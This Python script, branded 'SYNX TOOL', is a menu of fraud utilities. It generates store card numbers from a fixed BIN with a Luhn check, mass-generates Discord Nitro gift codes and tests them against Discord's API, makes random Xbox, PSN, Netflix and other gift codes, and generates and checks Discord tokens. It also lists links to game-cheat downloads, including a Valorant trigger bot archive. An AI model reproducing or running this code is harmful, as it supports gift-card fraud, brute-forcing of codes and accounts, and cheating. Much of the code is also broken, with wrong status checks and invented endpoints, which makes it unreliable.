import os 
import sys
import time 
import string
import random
import requests
import colorama
import platform
from colorama import Fore   
colorama.init()

def g(rolls):
    data = string.ascii_lowercase
    result = ""
    while rolls >= 1:
        c = random.choice(data)
        result = c + result
        rolls = rolls - 1
    return result



def title_menu():
    print(f'''{Fore.RED} 

                         ____   __   __  _   _  __  __
                        / ___|  \ \ / / | \ | | \ \/ /
                        \___ \   \ V /  |  \| |  \  / 
                         ___) |   | |   | |\  |  /  \ 
                        |____/    |_|   |_| \_| /_/\_\ 
                               ''')
    print("")
    print(f"{Fore.WHITE}                                  ! Synx#1685 ")
    print("")
    print(f"{Fore.WHITE}                            SYNX TOOL  |  V1")

    print(" ")
    print(f"{Fore.RED}===============================================================================")
    print(f"{Fore.RED}|          Generators        |    Hacks           |   Discord                 |")
    print(f"{Fore.RED}===============================================================================")
    print(f"{Fore.RED} [1]{Fore.WHITE} Amazon Store Card       {Fore.RED}| {Fore.RED} [7] {Fore.RESET}CS:GO Cheats{Fore.RED}  | {Fore.RED} [13] {Fore.RESET}Token Gen + Checker {Fore.RED}|")
    print(f"{Fore.RED} [2]{Fore.WHITE} Discord Nitro Gen       {Fore.RED}| {Fore.RED} [8] {Fore.RESET}Roblox Cheats {Fore.RED}|                           |")
    print(f"{Fore.RED} [3]{Fore.WHITE} Xbox Gift Card          {Fore.RED}| {Fore.RED} [9] {Fore.RESET}FiveM Cheats {Fore.RED} |                           |")
    print(f"{Fore.RED} [4]{Fore.WHITE} PSN Gift Card           {Fore.RED}| {Fore.RED} [10] {Fore.RESET}Rust Cheats{Fore.RED}  |                           |")
    print(f"{Fore.RED} [5]{Fore.WHITE} Netflix Gift Unchecked  {Fore.RED}| {Fore.RED} [11] {Fore.RESET}Minecraft {Fore.RED}   |                           |")
    print(f"{Fore.RED} [6]{Fore.WHITE} More Gens              {Fore.RED} | {Fore.RED} [12] {Fore.RESET}Valorant Hack{Fore.RED}|                           |")
    print(f"{Fore.RED}===============================================================================")
    print(" ")
    print(f"{Fore.RED} Select Option: ")
    print(" ")
# ------------------------------------------------------------------------- #

while True:
    time.sleep(2); os.system('cls') if platform.platform()[0] == 'W' else os.system('clear'); title_menu()

    choice = int(input(f"{Fore.RED}SYNX@Tool > "))

    if choice == 1:

        class validator():

            def __init__(self):
                self.cardNumber = None
                self.Brand = None

            def __findBrand(self):
                if self.cardNumber[:2] in ['34', '37']:
                    self.Brand = 'American Express'
                elif self.cardNumber[:3] in [
                        '300', '301', '302', '303', '304', '305'
                ]:
                    self.Brand = 'Diners Club - Carte Blanche'
                elif self.cardNumber[:2] in ['36']:
                    self.Brand = 'Diners Club - International'
                elif self.cardNumber[:2] in ['54']:
                    self.Brand = 'Diners Club - USA & Canada'
                elif self.cardNumber[:4] in ['6011'] or self.cardNumber[0:3] in [
                        '644', '645', '646', '647', '648', '649'
                ] or self.cardNumber[0:2] in ['65'] or self.cardNumber[0:6] in [
                        str(x) for x in range(622126, 622926)
                ]:
                    self.Brand = 'Discover'
                elif self.cardNumber[:3] in ['637', '638', '639']:
                    self.Brand = 'InstaPayment'
                elif self.cardNumber[:4] in [str(x) for x in range(3528, 3590)]:
                    self.Brand = 'JCB'
                elif self.cardNumber[:4] in [
                        '5018', '5020', '5038', '5893', '6304', '6759', '6761',
                        '6762', '6763'
                ]:
                    self.Brand = 'Maestro'
                elif self.cardNumber[:2] in ['51', '52', '53', '54', '55'
                                            ] or self.cardNumber[:6] in [
                                                str(x)
                                                for x in range(222100, 272100)
                                            ]:
                    self.Brand = 'MasterCard'
                elif self.cardNumber[:4] in [
                        '4026', '4508', '4844', '4913', '4917'
                ] or self.cardNumber[:6] == '417500':
                    self.Brand = 'VISA Electron'
                elif self.cardNumber[0] in ['4']:
                    self.Brand = 'VISA'
                else:
                    self.Brand = 'Unknown Brand'

            def validate(self, number):
                """
                number: str or int credit card number
                """
                if number is None:
                    return f'{Fore.RED}Not a valid Credit Card Number'
                if number is bool:
                    return f'{Fore.RED}Not a valid Credit Card Number'
                if number is float:
                    return f'{Fore.RED}Not a valid Credit Card Number'
                number = ''.join(x for x in str(number).strip().split())
                if number.isdigit() and 13 <= len(number) <= 19:
                    # Identify Brand
                    self.cardNumber = number
                    self.__findBrand()
                    # Luhn's Algorithm
                    lastDigit = int(number[-1])
                    base = [int(x) for x in reversed(number[:-1])]
                    base = [x if i % 2 != 0 else 2 * x for i, x in enumerate(base)]
                    base = [x if x <= 9 else x - 9 for x in base]
                    base = sum(base)
                    base = (base * 9) % 10
                    if base == lastDigit:
                        print(Fore.GREEN)
                        return f'{Fore.GREEN}[!] {self.cardNumber} is a valid Store Card!'
                    else:
                        print(Fore.RED)
                        return f'[!] {self.cardNumber} is not a valid Store Card!'
                else:
                    return 'Not a valid Credit Card Number'

    # ------------------------------------------------------------------------- #

        os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')
        title_menu()
        print(Fore.RED + " ")
        print(f" {Fore.RED}[1] {Fore.WHITE}1k Card")
        print(f" {Fore.RED}[2] {Fore.WHITE}2k Card")
        print(f" {Fore.RED}[3] {Fore.WHITE}5k Card")
        print(f" {Fore.RED}[4] {Fore.WHITE}10k Card")
        print(" ")
        print(" Which card to generate: ")
        print(" ")
        whatcard = input(f"{Fore.RED} [?] > ")
        print(" ")
        whatcard = int((whatcard))
        randomnums = "0123456789"

        if whatcard == 1:
            os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')
            title_menu()
            print("")
            print(" [?] How Many Cards Do You Want? ")
            print(" ")
            howmany = int(input(f"{Fore.RED} [?] > "))
            time.sleep(0.8)
            print("           [/] Starting")
            time.sleep(0.8)

            for x in range(howmany):
                bin = "60457811425"
                ff1 = random.choice(randomnums)
                ff2 = random.choice(randomnums)
                ff3 = random.choice(randomnums)
                ff4 = random.choice(randomnums)
                ff5 = random.choice(randomnums)
                cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(
                    ff5)
                print(validator().validate(int(cc)))

        if whatcard == 2:
            howmany = int(input(" [?] How Many Cards Do You Want? "))
            time.sleep(0.8)
            print("[/] Starting")
            time.sleep(0.8)
            for x in range(howmany):
                bin = "604578114"
                ff1 = random.choice(randomnums)
                ff2 = random.choice(randomnums)
                ff3 = random.choice(randomnums)
                ff4 = random.choice(randomnums)
                ff5 = random.choice(randomnums)
                ff6 = random.choice(randomnums)
                ff7 = random.choice(randomnums)
                cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(
                    ff5) + str(ff6) + str(ff7)
                print(validator().validate(int(cc)))

    # ------------------------------------------------------------------------- #

        if whatcard == 3:
            howmany = int(input(" [?] How Many Cards Do You Want? "))
            for x in range(howmany):
                bin = "604578118"
                ff1 = random.choice(randomnums)
                ff2 = random.choice(randomnums)
                ff3 = random.choice(randomnums)
                ff4 = random.choice(randomnums)
                ff5 = random.choice(randomnums)
                ff6 = random.choice(randomnums)
                ff7 = random.choice(randomnums)
                cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(
                    ff5) + str(ff6) + str(ff7)
                print(validator().validate(int(cc)))

        if whatcard == 4:
            howmany = input(" [?] How Many Cards Do You Want? ")
            time.sleep(0.8)
            print("[/] Starting")
            time.sleep(0.8)
            howmany = int(howmany)
            for x in range(howmany):
                bin = "6045781123"
                ff1 = random.choice(randomnums)
                ff2 = random.choice(randomnums)
                ff3 = random.choice(randomnums)
                ff4 = random.choice(randomnums)
                ff5 = random.choice(randomnums)
                ff6 = random.choice(randomnums)
                cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(
                    ff5) + str(ff6)
                print(validator().validate(int(cc)))

    # ------------------------------------------------------------------------- #

    elif choice == 2:
        os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')

        title_menu()
        print(" ")

        num = int(input(' Input How Many Codes to Generate and Check: '))

        with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
            print(" Your nitro codes are being generated, be patient!")

            start = time.time()

            for i in range(num):
                code = "".join(
                    random.choices(string.ascii_uppercase + string.digits +
                                string.ascii_lowercase,
                                k=19))

                file.write(f"https://discord.gift/{code}\n")

            print(f" Generated {num} codes | Time taken: {time.time() - start}\n")

        with open("Nitro Codes.txt") as file:
            for line in file.readlines():
                nitro = line.strip("\n")

                url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

                r = requests.get(url)

                if r.status_code == 200:
                    print(f"{Fore.GREEN} Valid | {nitro} ")
                    break
                else:
                    print(f"{Fore.RED} Invalid | {nitro} ")

        time.sleep(0.2)

        print(" ")
        print(
            f"{Fore.WHITE} Valid codes will be in Valid Codes.txt - if there none then keep generating :)"
        )

    # ------------------------------------------------------------------------- #

    elif choice == 3:
        print("\n How many of them?\n")
        nn = input(f"{Fore.RED} [?] > {Fore.WHITE}")
        n = int(nn)
        for x in range(n):

            v = g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5)
            url = "https://microsoft.com/api/entitlements/redeem/" + v

            s = requests.get(url)

            if s == 200:
                print(f"{Fore.GREEN} Valid | {v} ")
                break
            else:
                print(f"{Fore.RED} Invalid | {v} ")
        print(" ")
        print(f"{Fore.GREEN} Done!")

    # ------------------------------------------------------------------------- #

    elif choice == 4:
        os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')
        title_menu()
        print(" ")
        print(" Checked PS codes")
        print("")
        print(" How many of them?")
        print(" ")
        nn = input(f"{Fore.RED} [?] > ")
        print("")
        n = int(nn)
        for x in range(n):
            print("")
            v = (g(4) + "-" + g(4) + "-" + g(4))
            url = "https://playstation.com/api/redeem/" + v

            s = requests.get(url)

            if s == 200:
                print(f"{Fore.GREEN} Valid | {v} ")
                break
            else:
                print(f"{Fore.RED} Invalid | {v} ")

    # ------------------------------------------------------------------------- #

    elif choice == 5:
        os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')
        title_menu()

        upper_letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        lower_letter = 'abcdefghijklmnopqrstuvwxyz'
        digits = '0123456789'
        print(" ")
        amount = int(input(" Gift Code Amount : "))
        print(" ")
        print(f"{Fore.RED} All giftcodes aren't checked and are saved in netflixcodes.txt meaning you need to get a checker. ")
        print(f"{Fore.WHITE} ")
        for i in range(amount):
            code = "https://www.netflix.com/redeem/" + "".join(
                random.choices(string.ascii_uppercase + string.digits, k=11))
            print(" [GENERATED] " + code)
            giftcode = open('netflixcodes.txt', 'a')
            giftcode.write(code + "\n")


    # ------------------------------------------------------------------------- #

    elif choice == 6:
        os.system('cls') if platform.platform()[0] == 'W' else os.system('clear')
        title_menu()
        #interface
        print(" ")
        print(f"{Fore.RED} THESE CODES ARE UNCHECKED")

        print(f"{Fore.WHITE}")
        print(" What Giftcard you need to generate?")

        tt = input("\n [-] Amazon\n [-] Roblox\n [-] Fortnite\n [-] Ebay\n [-] iTunes\n [-] Paypal\n [-] Visa\n [-] Playstation\n [-] Steam\n [-] Xbox\n [-] PlayStore\n [-] Minecraft\n\n Enter Name: \n [?] > ")

        t = tt.lower()
        print("")
        print(" How many of them?")
        print(" ")
        nn = input(" [?] > ")
        print("")
        n = int(nn)
        if t == "minecraft":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(4)+"-"+g(4))
            
        if t == "paypal":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(4)+"-"+g(4))
                
        if t == "amazon":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(6)+"-"+g(4))
            
        if t == "netflix":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(6)+"-"+g(4))
            
        if t == "steam":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(6)+"-"+g(5))
            
        if t == "fortnite":
            for x in range(n):
                print("")
                print(g(5)+"-"+g(4)+"-"+g(4))
            
        if t == "roblox":
            for x in range(n):
                print("")
                print(g(3)+"-"+g(3)+"-"+g(4))
            
        if t == "itunes":
            for x in range(n):
                print("")
                print(g(16))
            
        if t == "ebay":
            for x in range(n):
                print("")
                print(g(10))
                
        if t == "playstore":
            for x in range(n):
                print("")
                print(g(4)+"-"+g(4)+"-"+g(4)+"-"+g(4)+"-"+g(4))
            
        print("")
        print("===They were generated successfully===")
        time.sleep(360)

    # ------------------------------------------------------------------------- #

    elif choice == 7:
        print("https://vacban.wtf/ \nhttps://cheater.fun/ \nhttps://cheater.ninja/%27")

    elif choice == 8:
        print("https://wearedevs.net/ \nhttps://robloxexploitz.com/ \nhttps://fluxteam.xyz/ \nhttps://krnl.ca/%27")

    elif choice == 9:
        print("    https://unknowncheats.me \nMore soon!")

    elif choice == 10:
        print("https://www.skycheats.com/ \nhttps://rusticaland.com/RustClients/Rusticaland-Rust-V2359[Lumberjack].7z ")

    elif choice == 11:
        print("https://hydraclient.com/#download \nhttps://liquidbounce.net/download")

    elif choice == 12:
        print("https://cdn.discordapp.com/attachments/1058365356516851812/1058365512578498621/image.png \nmake sure you set the enemy's highlight color to purple or it won't work image \nhttps://cdn.discordapp.com/attachments/1058365356516851812/1058365506987507792/Val_Trigger_Bot.rar")

    # ------------------------------------------------------------------------- #

    elif choice == 13:
        def Spinner():
            l = ['|', '/', '-', '\\']
            for i in l+l+l:
                sys.stdout.write('\r' + Fore.RED +'Starting GEN...'+i)
                sys.stdout.flush()
                time.sleep(0.2)

        Spinner()

        banner = (Fore.BLUE+'''
        _____    ___    _  __  _____   _   _      ____   _____   _   _ 
        |_   _|  / _ \  | |/ / | ____| | \ | |    / ___| | ____| | \ | |
        | |   | | | | | ' /  |  _|   |  \| |   | |  _  |  _|   |  \| |
        | |   | |_| | | . \  | |___  | |\  |   | |_| | | |___  | |\  |
        |_|    \___/  |_|\_\ |_____| |_| \_|    \____| |_____| |_| \_|
                                                                        ''')

        count = 0
        current_path = os.path.dirname(os.path.realpath(__file__))

        print()
        print(f"{Fore.RED}The best tool to generate tokens")
        print()
        print(Fore.RED)
        print(Fore.RED +"[1] "+Fore.RESET+"Token Generator(super fast!)")
        print(Fore.RED+"[2] "+Fore.RESET+"Token Checker(Checks all tokens you generated)")
        print(Fore.RED)
        opcion = input("\nSYNX@Tool >: ")
        if opcion=='1':
            print(banner)
            cantidad = input("\nAmount to generate: ")
            while int(count)<int(cantidad):
                Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
                f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
                f.write(Generated+"\n")
                print(Fore.RED +"Token: "+ Fore.RESET + Generated)
                count+=1
                if int(count)==int(cantidad):
                        print("\n" + Fore.GREEN +Fore.RED +"Tokens generated successfully!")
                        print(Fore.WHITE +Fore.BLUE +"Tokens saved in Generated.txt")
                        input(Fore.BLUE +Fore.BLUE +"\nPress enter to exit")


                        print(Fore.LIGHTGREEN_EX+"Closing...")

                        time.sleep(2)
                        sys.exit()
            pass
        if opcion=='2':
            os.system("cls")
            print("\n" + banner + "\n")
            with open('Generated.txt', 'r') as f:
                for line in f:
                    time.sleep(0)
                    token = line.rstrip("\n")
                    headers = {
                        'Authorization': f'{token}'  
                    }
                    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)

                try:
                    if src.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
                    else:
                        print(f'{Fore.RED}InValid token >{Fore.RESET} ' + token)
                except Exception:
                    print(f"{Fore.RED}Error{Fore.RESET}")
        pass